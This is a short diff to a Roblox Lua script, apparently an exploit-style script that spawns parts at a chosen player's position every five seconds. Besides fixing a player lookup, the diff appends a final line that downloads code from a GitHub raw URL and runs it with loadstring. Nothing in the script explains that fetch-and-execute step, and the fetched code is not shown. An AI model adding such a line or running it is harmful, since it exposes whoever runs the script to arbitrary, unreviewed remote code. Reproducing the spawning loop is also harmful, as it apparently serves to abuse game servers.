@@ -5,7 +5,7 @@ local function IDUFNY_fake_script() -- ScreenGui.Script
 
 	while true do
 		task.wait(5) -- 5 secs min 10 max, the server can't create too fast
-		local player = user -- put in ur name after "Players.urname"
+		local player = game.Players[user] -- put in ur name after "Players.urname"
 		local character = player.Character
 		local rootPart = character:WaitForChild("HumanoidRootPart")
 		local part = Instance.new("Part", workspace)
@@ -32,3 +32,4 @@ local function IDUFNY_fake_script() -- ScreenGui.Script
 	end
 end
 coroutine.wrap(IDUFNY_fake_script)()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CrystalzzDev/notif/main/loadstring"))()
